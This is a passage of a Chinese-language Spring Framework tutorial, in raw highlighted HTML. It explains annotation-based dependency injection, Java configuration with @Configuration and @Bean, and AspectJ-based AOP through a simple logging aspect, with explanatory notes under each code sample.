class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/27. */</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UseFunctionService</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">FunctionService</span> functionService<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">String</span> word<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> functionService<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>使用 @Service 注解声明当前 UseFunctionService 类是 Spring 管理的一个 Bean。</li><li>使用 @Autowired 将 FunctionService 的实体 Bean 注入到 UseFunctionService 中，让 UseFunctionService 具备 FunctionService 的功能，此处使用 JSR-330 的 @Inject 注解或者 JSR-250 的 @Resource 注解是等效的。</li></ol></blockquote><p>（3）配置类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ComponentScan</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/27. */</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.blinkfox.service.impl"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DiConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>使用 @Configuration 注解声明当前类是一个配置类。</li><li>使用 @ComponentScan 将 自动扫描包名下所有使用的 @Component、@Service、@Repository、@Controller 类，并注册为 Bean。</li></ol></blockquote><p>（4）运行。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>maintest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">DiConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">UseFunctionService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">AnnotationConfigApplicationContext</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FunctionMain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AnnotationConfigApplicationContext</span> context <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">DiConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UseFunctionService</span> useFunctionService <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">UseFunctionService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>useFunctionService<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"Spring"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>使用 AnnotationConfigApplicationContext 作为 Spring 容器，接收使用一个配置类作为参数。</li><li>获得声明配置的 UseFunctionService 的 Bean。</li></ol></blockquote><h3 id="（二）Java-配置"><a href="#（二）Java-配置" class="headerlink" title="（二）Java 配置"></a>（二）Java 配置</h3><h4 id="1-重点说明-1"><a href="#1-重点说明-1" class="headerlink" title="1. 重点说明"></a>1. 重点说明</h4><p>Java 配置是 Spring4.x 推荐的配置方式，可以完全替代 xml 配置；Java 配置也是 Spring Boot 推荐的配置方式。</p><p>Java 配置是通过 @Configuration 和 @Bean 来实现的。</p><ul><li>@Configuration 声明当前类是一个配置类，相当于一个Spring配置的 xml 文件。</li><li>@Bean 注解在方法上，声明当前方法的返回值是一个 Bean。</li></ul><p>何时使用 Java 配置或者注解配置呢？我们主要的原则是：全局配置使用 Java 配置（如数据库相关配置、MVC相关配置），业务 Bean 的配置使用注解配置（@Service、@Component、@Repository、@Controller）。</p><h4 id="2-Java配置代码示例"><a href="#2-Java配置代码示例" class="headerlink" title="2. Java配置代码示例"></a>2. Java配置代码示例</h4><p>（1）编写功能类的 Bean</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/27. */</span><span class="token comment">// 1</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavaConfigService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">String</span> word<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Hello "</span> <span class="token operator">+</span> word <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>此处没有使用 @Service 声明 Bean。</li></ol></blockquote><p>（2）使用功能类的 Bean</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/27. */</span><span class="token comment">// 1</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UseJavaConfigService</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 2</span>    <span class="token keyword">private</span> <span class="token class-name">JavaConfigService</span> javaConfigService<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setJavaConfigService</span><span class="token punctuation">(</span><span class="token class-name">JavaConfigService</span> javaConfigService<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>javaConfigService <span class="token operator">=</span> javaConfigService<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">String</span> word<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> javaConfigService<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>此处没有使用 @Service 声明 Bean。</li><li>此处没有使用 @Autowired 注解注入 Bean。</li></ol></blockquote><p>（3）Java 配置类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">JavaConfigService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">UseJavaConfigService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/27. */</span><span class="token annotation punctuation">@Configuration</span> <span class="token comment">// 1</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavaConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>  <span class="token comment">// 2</span>    <span class="token keyword">public</span> <span class="token class-name">JavaConfigService</span> <span class="token function">javaConfigService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">JavaConfigService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">UseJavaConfigService</span> <span class="token function">useJavaConfigService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">UseJavaConfigService</span> useJavaConfigService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UseJavaConfigService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        useJavaConfigService<span class="token punctuation">.</span><span class="token function">setJavaConfigService</span><span class="token punctuation">(</span><span class="token function">javaConfigService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>        <span class="token keyword">return</span> useJavaConfigService<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>使用 @Configuration 注解表明当前类是一个配置类，这意味着这个类型里可能有0个或者多个 @Bean 注解，此处没有使用包扫描，是因为所有的 Bean 都在此类中定义了。</li><li>使用 @Bean 注解声明当前方法 JavaConfigService 的返回值是一个 Bean，Bean的名称是方法名。</li><li>注入 FunctionService 的 Bean 时候直接调用 javaConfigService()。</li></ol></blockquote><p>（4）运行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>maintest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">JavaConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">UseJavaConfigService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">AnnotationConfigApplicationContext</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavaConfigMain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AnnotationConfigApplicationContext</span> context <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">JavaConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UseJavaConfigService</span> useJavaConfigService <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">UseJavaConfigService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>useJavaConfigService<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"Spring Java Config"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（三）AOP"><a href="#（三）AOP" class="headerlink" title="（三）AOP"></a>（三）AOP</h3><h4 id="1-重点说明-2"><a href="#1-重点说明-2" class="headerlink" title="1. 重点说明"></a>1. 重点说明</h4><p>AOP：面向切面编程，是面向对象编程（OOP）的补充。</p><p>Spring 的 AOP 的存在目的是为了解耦。AOP 可以让一组类共享相同的行为。在 OOP 中只能通过继承和实现接口来共享相同的行为，从而使代码的耦合度增强，且类继承只能为单继承，阻碍更多行为添加到一组类上，AOP 弥补了 OOP 的不足。</p><p>Spring 支持 AspectJ 的注解式切面编程。</p><ul><li>使用 @AspectJ 声明是一个切面。</li><li>使用 @After、@Before、Around 定义通知（advice）类型，可直接将拦截规则（切点）作为参数。</li><li>其中 @After、@Before、Around 参数的拦截规则为切点（PointCut），为了使切点复用，可使用 @PointCut 专门定义拦截规则，然后在 @After、@Before、Around 的参数中调用。</li><li>其中符合条件的每一个拦截处为连接点（JoinPoint）。</li></ul><p>Spring本身在事务处理（@Transcational）和数据缓存（@Cacheable）等都使用注解拦截。下面示例将演示基于注解和方法规则的拦截方式，演示一种模拟记录操作的日志系统的实现。</p><h4 id="2-注解拦截代码示例"><a href="#2-注解拦截代码示例" class="headerlink" title="2. 注解拦截代码示例"></a>2. 注解拦截代码示例</h4><p>（1）添加 Spring aop 支持及 AspectJ 依赖。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>springframework<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>spring<span class="token operator">-</span>aop<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">4.3</span><span class="token number">.3</span><span class="token punctuation">.</span><span class="token constant">RELEASE</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>aspectj<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>aspectjrt<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">1.8</span><span class="token number">.9</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>aspectj<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>aspectjweaver<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">1.8</span><span class="token number">.9</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）编写拦截规则的注解。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>annotation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/29. */</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Documented</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">LogAction</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">"这是默认的操作名称"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：<br>注解本身是没有功能的，就和 xml 一样。注解和 xml 都是一种元数据，元数据即解释数据的数据，这就是所谓的配置。注解的功能来自用这个注解的地方。</p></blockquote><p>（3）编写使用注解的被拦截类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">LogAction</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/29. */</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoAnnotationService</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@LogAction</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"注解式拦截的 add 操作"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）编写使用方法规则被拦截规类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/29. */</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoMethodService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（5）编写切面。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>aop</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">LogAction</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">JoinPoint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">After</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Aspect</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Pointcut</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">MethodSignature</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/29. */</span><span class="token annotation punctuation">@Aspect</span> <span class="token comment">// 1</span><span class="token annotation punctuation">@Component</span> <span class="token comment">// 2</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogAspect</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"@annotation(com.blinkfox.annotation.LogAction)"</span><span class="token punctuation">)</span> <span class="token comment">// 3</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">annotationPointCut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@After</span><span class="token punctuation">(</span><span class="token string">"annotationPointCut()"</span><span class="token punctuation">)</span> <span class="token comment">// 4</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">after</span><span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> joinPoint<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">MethodSignature</span> signature <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">MethodSignature</span><span class="token punctuation">)</span> joinPoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> signature<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LogAction</span> logAction <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">LogAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"---注解式拦截:"</span> <span class="token operator">+</span> logAction<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@After</span><span class="token punctuation">(</span><span class="token string">"execution(* com.blinkfox.service.impl.DemoMethodService.*(..))"</span><span class="token punctuation">)</span> <span class="token comment">// 6</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> joinPoint<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">MethodSignature</span> signature <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">MethodSignature</span><span class="token punctuation">)</span> joinPoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> signature<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token 